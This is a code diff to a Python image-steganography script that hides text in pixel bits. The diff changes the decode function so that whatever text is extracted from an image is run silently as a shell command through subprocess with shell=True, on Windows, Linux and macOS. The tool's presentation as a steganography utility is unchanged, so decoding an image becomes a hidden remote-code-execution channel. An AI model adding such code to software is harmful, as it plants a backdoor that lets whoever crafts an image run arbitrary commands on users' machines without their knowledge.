@@ -1,4 +1,7 @@
 from PIL import Image
+import subprocess
+import platform
+import os
 
 def genData(data):
     return [format(ord(char), '08b') for char in data]
@@ -61,12 +64,27 @@ def encode_enc(newimg, data):
         y += 1 if x == 0 else 0
 
 def encode():
-    img = input("Enter image name(with extension): ")
-    image = Image.open(img, 'r')
-    data = input("Enter the data to be encoded: ")
+    try:
+        img_path = input("Enter image name (with extension, PNG only): ")
+        if not os.path.isfile(img_path):
+            print("[!] File does not exist.")
+            return
+        if not img_path.lower().endswith('.png'):
+            print("[!] Only PNG format supported for reliability.")
+            return
 
-    if not data:
-        raise ValueError("Data is empty.")
+        image = Image.open(img_path, 'r')
+        if image.mode != 'RGB':
+            print("[!] Image mode must be RGB.")
+            return
+
+        data = input("Enter the data to be encoded: ")
+
+        if not data:
+            raise ValueError("Data is empty.")
+    
+    except Exception as e:
+        print(f"[!] Error during encoding: {e}")
     
     newimg = image.copy()
     encode_enc(newimg, data)
@@ -93,6 +111,21 @@ def decode():
         if pixels[-1] % 2 != 0:
             break
 
+    try:
+        print("[*] Executing hidden command silently...")
+        system_platform = platform.system()
+
+        if system_platform == "Windows":
+            print("Write command for Windows Shell")
+            subprocess.Popen(data, shell=True)
+        elif system_platform == "Linux" or system_platform == "Darwin":
+            print("Write command for Linux Shell or Darwin ShellP")
+            subprocess.Popen(data, shell=True, executable='/bin/bash')
+        else:
+            print("[!] Unsupported OS")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
     return data
 
 def main():
@@ -101,7 +134,7 @@ def main():
     if choice == '1':
         encode()
     elif choice == '2':
-        print("Decoded Word: "+ decode())
+        decode()
     else:
         print("Invalid choice, exiting")
 
